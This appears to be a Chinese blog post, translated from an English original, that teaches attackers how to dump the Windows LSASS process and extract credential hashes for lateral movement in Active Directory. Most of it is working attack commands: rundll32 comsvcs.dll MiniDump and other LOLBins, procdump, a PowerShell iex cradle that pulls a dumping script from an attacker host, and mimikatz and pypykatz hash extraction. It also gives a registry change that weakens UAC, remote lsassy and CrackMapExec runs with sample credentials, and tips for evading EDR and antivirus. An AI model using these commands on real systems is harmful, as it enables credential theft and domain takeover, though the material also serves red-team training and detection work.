
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/kqdssheng/p/18922628" title="发布于 2025-06-10 18:45">
    <span role="heading" aria-level="2">AD 横向移动-LSASS 进程转储</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/dumping-credentials-lsass-process-hashes/" target="_blank" rel="noopener nofollow">Dumping Credentials – LSASS Process Hashes</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<h2 id="导航">导航</h2>
<ul>
<li><a href="#id0" rel="noopener nofollow">0 前言</a></li>
<li><a href="#id1" rel="noopener nofollow">1 LSASS 进程简介</a></li>
<li><a href="#id2" rel="noopener nofollow">2 转储 LSASS 进程 – 任务管理器（GUI）</a></li>
<li><a href="#id3" rel="noopener nofollow">3 转储 LSASS 进程 – LOLBins（CLI）</a>
<ul>
<li><a href="#id3.1" rel="noopener nofollow">3.1 Comsvcs.dll</a></li>
<li><a href="#id3.2" rel="noopener nofollow">3.2 Rdrleakdiag.exe</a></li>
<li><a href="#id3.3" rel="noopener nofollow">3.3 Adplus.exe</a></li>
<li><a href="#id3.4" rel="noopener nofollow">3.4 Createdump.exe</a></li>
<li><a href="#id3.5" rel="noopener nofollow">3.5 Dump64.exe</a></li>
<li><a href="#id3.6" rel="noopener nofollow">3.6 DumpMinitool.exe</a></li>
<li><a href="#id3.7" rel="noopener nofollow">3.7 SQLDumper.exe</a></li>
</ul>
</li>
<li><a href="#id4" rel="noopener nofollow">4 转储 LSASS 进程 – 工具和脚本（CLI）</a>
<ul>
<li><a href="#id4.1" rel="noopener nofollow">4.1 Procdump64.exe</a></li>
<li><a href="#id4.2" rel="noopener nofollow">4.2 Out-Minidump.ps1</a></li>
</ul>
</li>
<li><a href="#id5" rel="noopener nofollow">5 离线提取 LSASS 文件 – Pypykatz</a></li>
<li><a href="#id6" rel="noopener nofollow">6 内存提取 LSASS 进程 – Mimikatz</a></li>
<li><a href="#id7" rel="noopener nofollow">7 远程提取 LSASS 进程</a>
<ul>
<li><a href="#id7.1" rel="noopener nofollow">7.1 Lsassy</a></li>
<li><a href="#id7.2" rel="noopener nofollow">7.2 CrackMapExec</a></li>
</ul>
</li>
</ul>
<hr>
<h2 id="-0前言-"><strong><div id="id0"> 0、前言 </div></strong></h2>
<p>在这篇文章中，我们将探讨可用于转储 LSASS 进程并提取其中哈希值的各种工具和技术。由于转储 LSASS 进程必须要有高完整性的管理员权限才能进行，因此在本文的各种场景中，它们转储的前提都是已拥有 本地管理员/域管理员/SYSTEM 权限。</p>
<p>首先，我们在 RDP 的桌面环境下使用任务管理器去转储 LSASS 进程；然后，在无 GUI 的命令行环境下使用 7+2 种方式去转储 LSASS 进程。</p>
<p>在通过上述各种方式转储进程之后，我们将进入攻击的下一阶段 – 提取哈希值。从 LSASS 进程中提取哈希的方式有 3 种：（1）从转储的进程文件中通过 Pypykatz 离线提取。（2）使用 Mimikatz 直接在受害机本机的内存中提取。（3）在获得管理员凭据的情况下，通过 Lsassy、CrackMapExec 工具远程从 LSASS 进程中提取。</p>
<h2 id="-1lsass-进程简介-"><strong><div id="id1"> 1、LSASS 进程简介 </div></strong></h2>
<p>LSASS（本地安全授权子系统服务）是 Windows 操作系统中一个非常核心且重要的系统进程，它主要用于处理 <em>用户身份验证、访问令牌生成、本地安全策略执行</em> 等任务。它的进程名是 <strong>lsass.exe</strong>。</p>
<p><strong>用户身份验证</strong>：LSASS 负责验证用户在本地或远程登录系统时的凭据（如用户名和密码）。当用户登录时，它会与 Active Directory 或本地账户数据库进行交互，确认用户身份是否合法。</p>
<p><strong>访问令牌生成</strong>：成功验证用户身份后，LSASS 创建一个访问令牌，用于标识用户及其权限，这个令牌随后由系统用于权限检查。</p>
<p><strong>本地安全策略执行</strong>： 它加载本地安全策略（如密码策略、账户锁定策略等）并在系统运行期间持续执行这些策略。</p>
<p>其中，<em>访问令牌生成</em> 功能是最令我们感兴趣的，因为它会将验证成功之后的用户凭据存储在内存中（直到系统下次重启失效）。而存储的凭据可以使用户在反复访问网络资源时（如文件共享），无需为每个远程服务反复输入凭据。那么在哪些场景下，才会发生凭据被存储于内存中呢？请看下面：</p>
<ul>
<li>登录计算机上的本地会话或远程桌面会话（RDP）</li>
<li>使用 RunAs&nbsp;执行任务</li>
<li>运行活动的 Windows 服务</li>
<li>运行计划任务或批处理作业</li>
<li>使用远程管理工具 (RSAT) 在本地计算机上执行任务</li>
</ul>
<blockquote>
<p>注：在现代 Windows 系统（win8+ 及 server 2012+）中，LSASS 受到保护进程机制（Protected Process Light, PPL）的保护，限制了对其内存的访问。</p>
</blockquote>
<h2 id="-2转储-lsass-进程--任务管理器gui"><strong><div id="id2"> 2、转储 LSASS 进程 – 任务管理器（GUI）</div></strong></h2>
<p>在这个例子中，假设我们已获得一个本地管理员帐户的凭据，且可以通过 RDP 成功访问目标主机。</p>
<pre><code class="language-bash">sudo xfreerdp /u:pwnt /p:'Password123' /v:172.16.1.50 +clipboard
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184237769-1981785355.png" alt="" loading="lazy"></p>
<p>登录之后，可以看到当前本地管理员的权限是高完整性权限，因此我们可以使用任务管理器去转储 LSASS 进程。</p>
<p>要创建进程转储文件，首先打开任务管理器（Taskmgr.exe）。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184052224-1697160025.png" alt="" loading="lazy"></p>
<p>然后在“详细信息”选项卡找到 <strong>lsass.exe</strong> 进程，并右键并选择“创建转储文件”。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184048778-1888709712.png" alt="" loading="lazy"></p>
<p>如果有效，将会出现一个弹框，向我们显示 DMP 文件的路径。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184032892-1953687505.png" alt="" loading="lazy"></p>
<p>Awesome！转储已成功创建，接下来就可以将其传输到攻击者机器进行哈希提取了。</p>
<h2 id="-3转储-lsass-进程--lolbinscli"><strong><div id="id3"> 3、转储 LSASS 进程 – LOLBins（CLI）</div></strong></h2>
<p>在这个示例中，假设我们只是获得了目标主机的 SYSTEM shell 立足点，没有 GUI 桌面环境可使用。</p>
<p>这次，我们将使用各种 Windows 二进制文件（LOLbins）来转储 LSASS 进程。当然这些程序可能是 windows 某些版本的系统中内置的，也可能是来自某些安装的软件或服务中携带的。因此，在使用这些程序之前，请务必先确认其是否存在于系统之上。确认命令如下：</p>
<pre><code class="language-cmd">cd "C:\Program Files" &amp;&amp; dir /S /B *adplus.exe* == *createdump.exe* == *dump64.exe* == *DumpMinitool.exe* == *Sqldumper.exe* &amp;&amp; cd "C:\Program Files (x86)" &amp;&amp; dir /S /B *adplus.exe* == *createdump.exe* == *dump64.exe* == *DumpMinitool.exe* == *Sqldumper.exe*
</code></pre>
<p>此外，由于我们滥用这些二进制文件的内置功能，因此该活动看起来不那么可疑，并且经常会绕过 EDR 工具。</p>
<blockquote>
<p>有关我们在本文中使用的所有 LOLBins 信息可以在 <a href="https://lolbas-project.github.io/#/dump" target="_blank" rel="noopener nofollow">这里</a> 找到。</p>
</blockquote>
<blockquote>
<p>注：这些工具虽然很隐蔽，但个人感觉很难用，而且效果也并不是太好，有时还可能会引发一些系统异常的问题。</p>
</blockquote>
<h4 id="-31comsvcsdll-"><strong><div id="id3.1"> 3.1、Comsvcs.dll </div></strong></h4>
<p>红队用来转储 LSASS 进程的最常见技术之一是利用 <strong>comsvcs.dll</strong> 的 <strong>MiniDump</strong> 功能。</p>
<p>首先，需要找到 LSASS 进程的 PID：</p>
<pre><code class="language-cmd">tasklist | findstr -i "PID lsass"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184032458-1928977887.png" alt="" loading="lazy"></p>
<p>然后，再使用 <strong>rundll32.exe</strong> 执行 <strong>comsvcs.dll</strong> 创建该进程的转储文件。</p>
<pre><code class="language-cmd">rundll32.exe C:\windows\system32\comsvcs.dll MiniDump 500 C:\windows\temp\dump.dmp full
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184039453-90061563.png" alt="" loading="lazy"></p>
<p>可以看到，DMP 文件已被成功创建。</p>
<blockquote>
<p>注：多次测试未能成功。</p>
</blockquote>
<h4 id="-32rdrleakdiagexe-"><strong><div id="id3.2"> 3.2、Rdrleakdiag.exe </div></strong></h4>
<p>rdrleakdiag.exe 也称为 Microsoft Windows 资源泄漏诊断工具，通常用于收集资源耗尽检测和解决方案 (RADAR)。</p>
<p>但是，该工具还具有内置功能，使我们能够使用 <strong>/fullmemdmp</strong> 选项执行内存转储。</p>
<pre><code class="language-cmd">rdrleakdiag.exe /p 500 /o c:\windows\temp /fullmemdmp /wait 1
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184032276-1624453177.png" alt="" loading="lazy"></p>
<p>运行第一个命令后，看起来好像没有起作用？那是因为我们还需要使用 <strong>/snap</strong> 选项再次运行该命令。</p>
<pre><code class="language-cmd">rdrleakdiag.exe /p 500 /o c:\windows\temp /fullmemdmp /snap
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184035038-1190282346.png" alt="" loading="lazy"></p>
<p>Amazing！再次成功创建了 LSASS 进程的转储。</p>
<h4 id="-33adplusexe-"><strong><div id="id3.3"> 3.3、Adplus.exe </div></strong></h4>
<p><a href="https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/" title="Windows SDK" target="_blank" rel="noopener nofollow">Windows SDK</a>（软件开发工具包）中提供了一组调试工具，主要用于辅助构建应用程序的构建过程。其中一个工具是 <strong>adplus.exe</strong>，它可用于转储指定进程的进程内存。如下所示：</p>
<pre><code class="language-cmd">.\adplus.exe -hang -pn lsass.exe -o c:\windows\temp -quiet
</code></pre>
<p>或者，如果我们想要更隐秘，那么我们可以使用 <strong>tasklist</strong> 命令找到 LSASS 进程的 PID，然后在命令中指定 PID，如下所示：</p>
<pre><code class="language-cmd">.\adplus.exe -hang -p 608 -o c:\windows\temp -quiet
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184052650-653539328.png" alt="" loading="lazy"></p>
<p>一旦“调试”完成，我们就可以从输出中复制并粘贴文件夹位置，并看到我们的 DMP 文件已创建。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184034641-830647570.png" alt="" loading="lazy"></p>
<h4 id="-34createdumpexe-"><strong><div id="id3.4"> 3.4、Createdump.exe </div></strong></h4>
<p>如果主机正在运行 IIS Web 服务器，那么很可能安装了 dotnet。如果安装了 <strong>dotnet</strong>，那么系统上应该就有 <strong>createdump.exe</strong>；或者，如果目标上安装了 <strong>Microsoft Visual Studio</strong> ，那么系统中也可能存在 <strong>createdump.exe</strong>。</p>
<p>与 adplus.exe 不同，creatdump.exe 没有在命令行中输入进程名称的选项。因此，我们需要首先使用 tasklist 命令确定 LSASS 进程的 PID ，然后在命令中指定 PID，如下所示：</p>
<pre><code class="language-cmd">.\createdump.exe -n -f c:\windows\temp\dump.dmp 596
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184034241-1573950115.png" alt="" loading="lazy"></p>
<h4 id="-35dump64exe-"><strong><div id="id3.5"> 3.5、Dump64.exe </div></strong></h4>
<p><strong>Dump64.exe</strong> 也是 <strong>Microsoft Visual Studio</strong> 中的一个工具，与 createdump.exe 类似，它也需要首先确定 LSASS 进程的 PID 。</p>
<pre><code class="language-cmd">.\dump64.exe 596 c:\windows\temp\dump64.dmp
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184036780-1151544603.png" alt="" loading="lazy"></p>
<h4 id="-36dumpminitoolexe-"><strong><div id="id3.6"> 3.6、DumpMinitool.exe </div></strong></h4>
<p><strong>DumpMinitool.exe</strong> 也是 <strong>Microsoft Visual Studio</strong> 附带的一个内存转储工具，它也需要首先确定 LSASS 进程的 PID 。</p>
<pre><code class="language-cmd">DumpMinitool.exe --file c:\windows\temp\dump.txt --processId 596 --dumpType Full
</code></pre>
<h4 id="-37sqldumperexe-"><strong><div id="id3.7"> 3.7、SQLDumper.exe </div></strong></h4>
<p><strong>SQLDumper.exe</strong> 是 <strong>Microsoft SQL Server</strong> 携带的一个工具，它也需要首先确定 LSASS 进程的 PID 。</p>
<pre><code class="language-cmd">./sqldumper.exe 592 0 0x01100
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184044224-52108252.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184029309-774007738.png" alt="" loading="lazy"></p>
<h2 id="-4转储-lsass-进程--工具和脚本cli"><strong><div id="id4"> 4、转储 LSASS 进程 – 工具和脚本（CLI）</div></strong></h2>
<p>到目前为止，除了我们前面介绍的七种 LOLBins 命令之外，还有一些其它的外部工具也可以用来转储 LSASS 进程，分别是 <strong>Procdump64.exe</strong> 和 <strong>Out-Minidump.ps1</strong>。</p>
<h4 id="-41procdump64exe-"><strong><div id="id4.1"> 4.1、Procdump64.exe </div></strong></h4>
<p><strong>Procdump64.exe</strong> 是 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener nofollow">Sysinternals</a> 套件的一个工具，专门用于转储进程。用法如下：</p>
<pre><code class="language-cmd">.\procdump64.exe -ma lsass.exe .\pdump.dmp -accepteula
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184034070-1351987681.png" alt="" loading="lazy"></p>
<p>此外，我们还可以通过传递 LSASS 进程的 PID 来转储进程：</p>
<pre><code class="language-cmd">.\procdump64.exe -ma 592 c:\windows\temp\pdump.dmp -accepteula
</code></pre>
<h4 id="-42out-minidumpps1-"><strong><div id="id4.2"> 4.2、Out-Minidump.ps1 </div></strong></h4>
<p><strong>Out-Minidump.ps1</strong> 是 <a href="https://github.com/BC-SECURITY/Empire" target="_blank" rel="noopener nofollow">Empire</a>&nbsp;后利用框架的一个 Powershell 脚本工具，它也专门用于转储进程。</p>
<p>下载该工具的副本，然后在底部附加以下命令：</p>
<pre><code class="language-powershell">echo 'Get-Process lsass | Out-Minidump' &gt;&gt; Out-Minidump.ps1
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184032784-1477028384.png" alt="" loading="lazy"></p>
<p>最后就可以在受害机运行以下命令来转储 LSASS 进程：</p>
<pre><code class="language-powershell">iex(new-object net.webclient).downloadstring('http://172.16.1.30/Out-Minidump.ps1')
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184031021-721174612.png" alt="" loading="lazy"></p>
<p>如果我们不想转储出来的文件名称中携带 lsass 这样的关键名字（以防杀毒软件的检测），我们可以通过编辑脚本中的以下行来解决这个问题：</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184033229-1456528974.png" alt="" loading="lazy"></p>
<h2 id="-5离线提取-lsass-文件--pypykatz-"><strong><div id="id5"> 5、离线提取 LSASS 文件 – Pypykatz </div></strong></h2>
<p>在以多种不同的方式转储 LSASS 进程之后，我们现在拥有同一个 DMP 文件的多个版本。这时，我们只需将其中一个 DMP 文件传输到攻击机，然后在攻击机本地离线提取哈希值。</p>
<p><a href="https://github.com/skelsec/pypykatz" target="_blank" rel="noopener nofollow">Pypykatz</a> 是 Mimikatz 的纯 Python 实现，它允许我们离线转储 dump 文件中的哈希值。用法如下：</p>
<pre><code class="language-bash">pypykatz lsa minidump dump.dmp
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184033481-1951259292.png" alt="" loading="lazy"></p>
<p>可以看到，域管理员“nessex” 曾登录该主机并留下了它的凭证令牌！因此，我们现在可以通过哈希传递转向 DC 并完全接管域控！</p>
<h2 id="-6内存提取-lsass-进程--mimikatz-"><strong><div id="id6"> 6、内存提取 LSASS 进程 – Mimikatz </div></strong></h2>
<p>转储 LSASS 进程的另一种方法是使用 <a href="https://github.com/ParrotSec/mimikatz" target="_blank" rel="noopener nofollow">Mimikatz</a>，它不需要像上面那些工具一样需要先创建 DMP 文件然后再提取哈希，而是直接在内存中的 LSASS 进程中提取哈希。用法如下：</p>
<pre><code class="language-cmd">.\mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" "exit"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184054720-1070157607.png" alt="" loading="lazy"></p>
<p>可以看到，我们再次获得了域管理员用户 nessex 的 NT 哈希。</p>
<h2 id="-7远程提取-lsass-进程-"><strong><div id="id7"> 7、远程提取 LSASS 进程 </div></strong></h2>
<p>对于转储 LSASS 进程的最后一组示例，我们将了解如何远程执行转储。而要远程转储，我们需要满足以下三个标准中的至少一个：</p>
<ul>
<li>本地 administrator 帐户的哈希值或密码（本地管理员组的成员不可以）</li>
<li>域管理员组的成员帐户的哈希值或密码</li>
<li>本地 SYSTEM 账户（计算机账户）的哈希值</li>
</ul>
<blockquote>
<p>注：本地管理员组的成员不可以的原因。由于 UAC 的原因，导致通过此凭证远程过去的权限其实是中完整性的管理员权限。因此，这种权限不足以进行 LSASS 进程转储，因此不可以。</p>
<p>此外，再提供一关闭 UAC 的命令：<code>reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code>。</p>
</blockquote>
<p>在下面的例子中，假设我们已获得了目标机器的一个本地管理员组成员的凭证，并且目标 UAC 也是处于关闭的状态。在使用 CrackMapExec 检查访问权限时也显示“Pwn3d!”，这表明我们有能力对目标进行远程访问！</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184035611-1091866361.png" alt="" loading="lazy"></p>
<h4 id="-71lsassy-"><strong><div id="id7.1"> 7.1、Lsassy </div></strong></h4>
<p>我们将使用的第一个从 LSASS 进程远程提取哈希的工具是名为 <a href="https://github.com/Hackndo/lsassy" target="_blank" rel="noopener nofollow">Lsassy</a> 的出色工具。它并不像 Mimikatz 那样直接从内存中提取哈希值，而是先使用 comsvcs.dll 创建 LSASS 进程的转储，然后再使用 Pypykatz 在本地提取哈希值。这相当于是将我们上述的手动流程给自动化了而已。</p>
<blockquote>
<p>值得注意的是，Lsassy 已经集成到 crackmapexec 中。</p>
</blockquote>
<pre><code class="language-bash">lsassy -u pwnt -p Password123 172.16.1.50

#哈希用法：lsassy -u Administrator -H aad3b435b51404eeaad3b435b51404ee: 3542d79d5d17bc9d3014d4d56b5e3060 172.16.1.50
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184100872-384565712.png" alt="" loading="lazy"></p>
<p>BOOM！可以看到，它成功提取了五个 NTLM 哈希，其中还包括本地 SYSTEM（即带 <code>$</code> 的计算机帐户）。</p>
<p>Lsassy 做的另一件很酷的事情是，它为找到的所有哈希值都创建了 Kerberos 票证，然后就可以在传递票证攻击中使用这些票证通过 Kerberos 进行身份验证。</p>
<h4 id="-72crackmapexec-"><strong><div id="id7.2"> 7.2、CrackMapExec </div></strong></h4>
<p>如上所述，Lsassy 被集成到了 <strong>CrackMapExec</strong> 中，那我们看看该如何使用它：</p>
<pre><code class="language-bash">crackmapexec smb 172.16.1.50 -u pwnt -p 'Password123' --local-auth -M lsassy

#哈希用法： crackmapexec smb 172.16.1.50 -u Administrator -H aad3b435b51404eeaad3b435b51404ee: 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -M lsassy
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202506/1503193-20250610184033721-1846235614.png" alt="" loading="lazy"></p>
<p>可以看到，输出并不如使用 Lsassy 时那么丰富，只提取到了 4 个哈希值。这是因为 CrackMapExec 会“清理”输出，只显示“已登录”用户的哈希值。</p>
<p>Amazing！这两种技术都能很好地远程转储 LSASS 进程。</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2025-06-10 18:46">2025-06-10 18:45</span>&nbsp;
<a href="https://www.cnblogs.com/kqdssheng">扛枪的书生</a>&nbsp;
阅读(<span id="post_view_count">21</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18922628);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18922628', targetLink: 'https://www.cnblogs.com/kqdssheng/p/18922628', title: 'AD 横向移动-LSASS 进程转储' })">举报</a>
</div>
        